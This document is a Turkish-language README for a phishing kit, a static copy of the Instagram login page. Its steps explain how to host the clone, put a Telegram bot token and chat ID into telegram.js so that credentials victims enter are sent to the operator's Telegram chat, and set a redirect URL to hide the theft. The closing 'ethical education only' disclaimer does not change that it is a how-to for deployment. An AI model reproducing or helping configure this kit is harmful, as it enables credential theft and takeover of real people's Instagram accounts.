# Instagram Login - Statik Versiyon

Bu paket, Instagram login sayfasının statik versiyonunu içerir. Herhangi bir sunucu veya Node.js çalıştırmaya gerek olmadan direkt olarak herhangi bir web hosting hizmetine yüklenebilir.

## Kurulum Adımları

1. Bu klasördeki tüm dosyaları web hosting hizmetinize yükleyin.
2. `telegram.js` dosyasındaki aşağıdaki değişkenleri kendi bilgilerinizle güncelleyin:
   - `TELEGRAM_BOT_TOKEN`: Telegram botunuzun API token'ı
   - `TELEGRAM_CHAT_ID`: Mesajların gönderileceği chat ID

## Telegram Bot Kurulumu:

1. Telegram'da @BotFather ile konuşup `/newbot` komutu ile yeni bir bot oluşturun
2. Size verilen API token'ı kaydedin (`TELEGRAM_BOT_TOKEN` olarak kullanın)
3. Bot ile bir konuşma başlatın veya botu bir gruba ekleyin
4. `https://api.telegram.org/bot[TOKEN]/getUpdates` adresine gidip chat ID'yi alın (`TELEGRAM_CHAT_ID` olarak kullanın)

## Yönlendirme URL'ini Değiştirme

Kullanıcılar giriş yaptıktan sonra yönlendirilecek URL'i değiştirmek için:

1. `telegram.js` dosyasındaki `REDIRECT_URL` değişkenini istediğiniz URL ile değiştirin.
   - Örneğin: "https://itiraflar.kesug.com/hata/" yerine "https://facebook.com" yazabilirsiniz.

## Dosya Yapısı

- `index.html`: Ana HTML dosyası
- `assets/`: JavaScript ve CSS dosyalarını içeren klasör
- `images/`: Görselleri içeren klasör
- `telegram.js`: Telegram bot entegrasyonu kodunu içeren JavaScript dosyası

## Güvenlik Uyarısı

- CORS (Cross-Origin Resource Sharing) hataları yaşanabilir
- Telegram bot token'ı frontend kodunda görünür durumdadır, bu bilgileri güvende tutun
- Bu site sadece etik eğitim amaçlı kullanılmalıdır. İzinsiz kullanım yasalara aykırı olabilir.